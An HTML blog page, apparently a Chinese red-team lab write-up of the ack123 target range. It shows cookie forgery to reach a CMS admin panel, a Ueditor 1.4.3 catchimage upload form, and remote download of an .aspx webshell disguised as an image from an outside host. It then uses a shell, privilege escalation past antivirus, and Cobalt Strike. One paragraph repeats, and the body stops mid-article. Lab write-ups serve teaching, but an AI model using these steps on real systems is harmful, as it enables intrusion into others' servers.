@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="简介此靶场为暗月师傅的 2021 年 9 月的红队考核靶场 ack123 主要考点 站库分离外网打点 过 360 全家桶 过 windwos defender 过火绒 内网漫游 多层内网渗透 横向渗透 jwt token 密钥破解 权限提升 域内渗透  靶场拓扑图 信息收集打开网站发现是 hdhcms（好得很 cms） 搭建的  随手一个 admin 目录打上去就发现了 cms 后台  注册一个账">
+<meta property="og:type" content="article">
+<meta property="og:title" content="暗月九月考核项目靶场 WriteUp">
+<meta property="og:url" content="http://example.com/posts/400502091/index.html">
+<meta property="og:site_name" content="Brich">
+<meta property="og:description" content="简介此靶场为暗月师傅的 2021 年 9 月的红队考核靶场 ack123 主要考点 站库分离外网打点 过 360 全家桶 过 windwos defender 过火绒 内网漫游 多层内网渗透 横向渗透 jwt token 密钥破解 权限提升 域内渗透  靶场拓扑图 信息收集打开网站发现是 hdhcms（好得很 cms） 搭建的  随手一个 admin 目录打上去就发现了 cms 后台  注册一个账">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633588914/Xnip2021-10-07_14-41-22_pu4v9r.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635836591/Xnip2021-11-02_15-01-34_e28zpr.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635837209/Xnip2021-11-02_15-09-38_ttarms.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635837213/Xnip2021-11-02_15-12-20_pst9h4.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635841276/Xnip2021-11-02_16-03-07_y67o6g.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635841402/Xnip2021-11-02_16-23-07_qetlkn.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635841544/Xnip2021-11-02_16-25-33_dwrhk6.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635846569/Xnip2021-11-02_17-48-42_jp60me.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635846859/Xnip2021-11-02_17-53-03_aiv4iw.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635846948/Xnip2021-11-02_17-54-03_zvofde.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635847080/Xnip2021-11-02_17-56-42_wsur8r.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635847614/Xnip2021-11-02_18-04-07_vruqh8.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635847666/Xnip2021-11-02_18-04-36_arhrxo.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635847723/Xnip2021-11-02_18-06-23_opqijj.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635847754/Xnip2021-11-02_18-09-04_msem1j.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635848372/Xnip2021-11-02_18-13-31_ab99zn.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635848430/Xnip2021-11-02_18-19-15_dw6wmj.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635851748/Xnip2021-11-02_19-14-13_ycxn8z.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635853652/Xnip2021-11-02_19-47-04_vkuuqa.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635854645/Xnip2021-11-02_20-03-22_omydrr.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635855931/Xnip2021-11-02_20-08-22_ze0lc0.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635855938/Xnip2021-11-02_20-08-57_kv2vap.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635856164/Xnip2021-11-02_20-28-24_fpskcw.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635856166/Xnip2021-11-02_20-28-34_gpfw2r.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857571/Xnip2021-11-02_20-37-21_e6o0yb.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857610/Xnip2021-11-02_20-45-48_vglenb.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857650/Xnip2021-11-02_20-47-45_edkdbh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857689/Xnip2021-11-02_20-49-31_bmqfbz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857688/Xnip2021-11-02_20-52-22_bghquk.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-11-49_q8w5xg.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_23-12-10_rdyhcm.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635857951/Xnip2021-11-02_20-58-31_bswpdi.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866051/Xnip2021-11-02_23-14-00_kqnrxr.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635859702/Xnip2021-11-02_21-28-07_b5whhl.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635860574/Xnip2021-11-02_21-34-52_w4b10m.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635860581/Xnip2021-11-02_21-38-02_jwy31k.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635860935/Xnip2021-11-02_21-48-37_ovtscz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635861501/Xnip2021-11-02_21-56-51_gkidun.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635861598/Xnip2021-11-02_21-59-48_hjooas.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635863373/Xnip2021-11-02_22-20-01_pqnnca.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635863403/Xnip2021-11-02_22-20-22_trzdbt.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635863441/Xnip2021-11-02_22-24-12_wy7dto.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635863453/Xnip2021-11-02_22-28-37_zfjri7.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635863621/Xnip2021-11-02_22-32-18_nl8k7j.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635865952/Xnip2021-11-02_22-36-19_xryii6.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866243/Xnip2021-11-02_23-17-09_toipcw.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866501/Xnip2021-11-02_23-21-23_gy8bqd.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866900/Xnip2021-11-02_23-28-06_dgdhpe.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-19-56_l3pbnz.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635866499/Xnip2021-11-02_23-20-21_rx46rk.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635905450/Xnip2021-11-03_10-10-38_i79g83.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635905427/Xnip2021-11-03_10-10-06_irrxtd.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635906079/Xnip2021-11-03_10-13-46_htlv6z.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635906084/Xnip2021-11-03_10-15-04_x3kgfx.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635906154/Xnip2021-11-03_10-22-07_afxdda.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635906344/Xnip2021-11-03_10-25-28_zoluca.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-02-05_gv9tlh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635908606/Xnip2021-11-03_11-03-08_lnwqpp.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635908696/Xnip2021-11-03_11-04-44_vi6pii.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635921833/Xnip2021-11-03_14-43-20_m7ndye.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922097/Xnip2021-11-03_14-47-10_zpuend.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922096/Xnip2021-11-03_14-48-02_s5v9eh.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922130/Xnip2021-11-03_14-48-36_pprrq7.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922277/Xnip2021-11-03_14-51-05_fvuujf.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922372/Xnip2021-11-03_14-52-20_t4pns1.png">
+<meta property="og:image" content="https://res.cloudinary.com/lin1109/image/upload/v1635922632/Xnip2021-11-03_14-56-56_jzmwtw.png">
+<meta property="article:published_time" content="2021-09-07T09:06:31.000Z">
+<meta property="article:modified_time" content="2022-03-21T08:24:53.485Z">
+<meta property="article:author" content="lin">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/lin1109/image/upload/v1633588914/Xnip2021-10-07_14-41-22_pu4v9r.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="https://typro-1304950244.cos.ap-shanghai.myqcloud.com/img/%E7%9B%86%E6%A0%BD19.png">
+        
+      
+    
+    <!-- title -->
+    <title>暗月九月考核项目靶场 WriteUp</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/vlog/">vlog</a></li><!--
+     --><!--
+       --><li><a href="/gallery/">Photo</a></li><!--
+     --><!--
+       --><li><a href="/friends/">Friends</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/posts/2854784317/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/posts/775123418/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/posts/400502091/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/posts/400502091/&text=暗月九月考核项目靶场 WriteUp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/posts/400502091/&is_video=false&description=暗月九月考核项目靶场 WriteUp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=暗月九月考核项目靶场 WriteUp&body=Check out this article: http://example.com/posts/400502091/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/posts/400502091/&title=暗月九月考核项目靶场 WriteUp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/posts/400502091/&name=暗月九月考核项目靶场 WriteUp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/posts/400502091/&t=暗月九月考核项目靶场 WriteUp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E8%A6%81%E8%80%83%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text">主要考点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E6%8B%93%E6%89%91%E5%9B%BE"><span class="toc-number">3.</span> <span class="toc-text">靶场拓扑图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">4.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0-cookie-%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%BA%AB%E4%BB%BD%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0"><span class="toc-number">5.</span> <span class="toc-text">伪造 cookie 以管理员身份登录后台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%A8%A1%E7%89%88%E5%A4%84-getshell"><span class="toc-number">6.</span> <span class="toc-text">后台模版处 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1-Bypass-%E6%9D%80%E8%BD%AF%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">7.</span> <span class="toc-text">WEB1 Bypass 杀软上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">WEB1 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA1-Bypass-%E7%81%AB%E7%BB%92%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">9.</span> <span class="toc-text">DATA1 Bypass 火绒上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">10.</span> <span class="toc-text">DATA1 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JWT-Token-%E7%88%86%E7%A0%B4"><span class="toc-number">11.</span> <span class="toc-text">JWT Token 爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin-%E5%86%99%E6%97%A5%E5%BF%97-getshell"><span class="toc-number">12.</span> <span class="toc-text">phpmyadmin 写日志 getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB2-%E4%B8%8A%E7%BA%BF-cs"><span class="toc-number">13.</span> <span class="toc-text">WEB2 上线 cs</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB2-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">14.</span> <span class="toc-text">WEB2 内网信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#spn-%E7%A5%A8%E6%8D%AE%E7%88%86%E7%A0%B4"><span class="toc-number">15.</span> <span class="toc-text">spn 票据爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#spn-%E7%AE%80%E4%BB%8B"><span class="toc-number">15.1.</span> <span class="toc-text">spn 简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN-%E6%9C%8D%E5%8A%A1%E4%B8%BB%E4%BD%93%E5%90%8D%E7%A7%B0%E5%8F%91%E7%8E%B0"><span class="toc-number">15.2.</span> <span class="toc-text">SPN 服务主体名称发现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-GetUserSPNs-ps1-%E8%84%9A%E6%9C%AC"><span class="toc-number">15.3.</span> <span class="toc-text">使用 GetUserSPNs.ps1 脚本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DC-%E4%B8%8A%E7%BA%BF"><span class="toc-number">16.</span> <span class="toc-text">DC 上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DATA2-%E4%B8%8A%E7%BA%BF"><span class="toc-number">17.</span> <span class="toc-text">DATA2 上线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E4%B9%8B%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">18.</span> <span class="toc-text">权限维持之黄金票据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#END"><span class="toc-number">19.</span> <span class="toc-text">END</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        暗月九月考核项目靶场 WriteUp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-09-07T09:06:31.000Z" itemprop="datePublished">2021-09-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>此靶场为暗月师傅的 2021 年 9 月的红队考核靶场 ack123</p>
+<h2 id="主要考点"><a href="#主要考点" class="headerlink" title="主要考点"></a>主要考点</h2><ol>
+<li>站库分离外网打点</li>
+<li>过 360 全家桶</li>
+<li>过 windwos defender</li>
+<li>过火绒</li>
+<li>内网漫游</li>
+<li>多层内网渗透</li>
+<li>横向渗透</li>
+<li>jwt token 密钥破解</li>
+<li>权限提升</li>
+<li>域内渗透</li>
+</ol>
+<h2 id="靶场拓扑图"><a href="#靶场拓扑图" class="headerlink" title="靶场拓扑图"></a>靶场拓扑图</h2><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1633588914/Xnip2021-10-07_14-41-22_pu4v9r.png"></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开网站发现是 hdhcms（好得很 cms） 搭建的</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635836591/Xnip2021-11-02_15-01-34_e28zpr.png"></p>
+<p>随手一个 admin 目录打上去就发现了 cms 后台</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635837209/Xnip2021-11-02_15-09-38_ttarms.png"></p>
+<p>注册一个账号进去看看，发现普通账户功能相当少，得想办法搞到管理员权限</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635837213/Xnip2021-11-02_15-12-20_pst9h4.png"></p>
+<h2 id="伪造-cookie-以管理员身份登录后台"><a href="#伪造-cookie-以管理员身份登录后台" class="headerlink" title="伪造 cookie 以管理员身份登录后台"></a>伪造 cookie 以管理员身份登录后台</h2><p>回到后台登录处，抓包分析</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841276/Xnip2021-11-02_16-03-07_y67o6g.png"></p>
+<p>这个 admincook 可能是鉴权参数，修改 cookie 为 admincook&#x3D;adminuser&#x3D;admin 即可以管理员身份进入后台</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841402/Xnip2021-11-02_16-23-07_qetlkn.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635841544/Xnip2021-11-02_16-25-33_dwrhk6.png"></p>
+<p>发现这个 cms 有富文本编辑器：百度 Ueditor 1.4.3，想起来这玩意好像是有漏洞的</p>
+<p>需要构造一个上传 shell 的页面</p>
+<p>网上的 poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>发现这个 cms 有富文本编辑器：百度 Ueditor 1.4.3，想起来这玩意好像是有漏洞的</p>
+<p>需要构造一个上传 shell 的页面</p>
+<p>网上的 poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://xxxxxxxxx/ueditor/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p>poc 中的 action 路径需要修改一下，这里直接盲猜了一波，结果一发入魂，返回 {“state”:” 参数错误：没有指定抓取源”} 也说明这个版本有漏洞。</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846569/Xnip2021-11-02_17-48-42_jp60me.png"></p>
+<p>修改后的 poc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot; enctype=&quot;application/x-www-form-urlencoded&quot;  method=&quot;POST&quot;&gt;  &lt;p&gt;shell addr: &lt;input type=&quot;text&quot; name=&quot;source[]&quot; /&gt;&lt;/p &gt;  &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="后台模版处-getshell"><a href="#后台模版处-getshell" class="headerlink" title="后台模版处 getshell"></a>后台模版处 getshell</h2><p>后台模版处可以部署我们的 poc 来构造一个远程下载 webshell 的页面</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846859/Xnip2021-11-02_17-53-03_aiv4iw.png"></p>
+<p>在模版首页可以知道模版文件的路径</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635846948/Xnip2021-11-02_17-54-03_zvofde.png"></p>
+<p>访问一下我们的 shell.html</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847080/Xnip2021-11-02_17-56-42_wsur8r.png"></p>
+<p>制作一个以.jpg.aspx 为后缀的图片马放在远程服务器上，这里就不细说了，网上一大堆教程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.1.1.1/2.jpg.aspx</span><br></pre></td></tr></table></figure>
+
+<p>远程下载我们的图片马</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847614/Xnip2021-11-02_18-04-07_vruqh8.png"></p>
+<p>成功后会返回 webshell 路径</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847666/Xnip2021-11-02_18-04-36_arhrxo.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/upfiles/image/20211102/6377147304762855064957505.aspx</span><br></pre></td></tr></table></figure>
+
+<p>访问一下 webshell，虽然页面报错，但是可以连接</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847723/Xnip2021-11-02_18-06-23_opqijj.png"></p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635847754/Xnip2021-11-02_18-09-04_msem1j.png"></p>
+<h2 id="WEB1-Bypass-杀软上线-cs"><a href="#WEB1-Bypass-杀软上线-cs" class="headerlink" title="WEB1 Bypass 杀软上线 cs"></a>WEB1 Bypass 杀软上线 cs</h2><p>查了一下进程，发现有 360 全家桶还有护卫神，而且当前权限是 iis 的权限，权限比较低</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635848372/Xnip2021-11-02_18-13-31_ab99zn.png"></p>
+<p>上传个哥斯拉的马，哥斯拉直接土豆提权绕过 AV 上线 cs</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635848430/Xnip2021-11-02_18-19-15_dw6wmj.png"></p>
+<p>返回 system 权限会话</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635851748/Xnip2021-11-02_19-14-13_ycxn8z.png"></p>
+<h2 id="WEB1-内网信息收集"><a href="#WEB1-内网信息收集" class="headerlink" title="WEB1 内网信息收集"></a>WEB1 内网信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+
+
+
+<p>发现另外一个网段</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635853652/Xnip2021-11-02_19-47-04_vkuuqa.png"></p>
+<p>使用 cs 自带的工具扫一下存活和端口，发现只有两台主机、192.168.183.134 是本机、还有一台 192.168.183.135 开了 1433 端口</p>
+<p>推测是站库分离、在 192.168.183.134 这台找到了数据库配置文件，直接是 sa 权限</p>
+<p><img src="https://res.cloudinary.com/lin1109/image/upload/v1635854645/Xnip2021-11-02_20-03-22_omydrr.png"></p>
+<p>掏出大马直接淦</p>
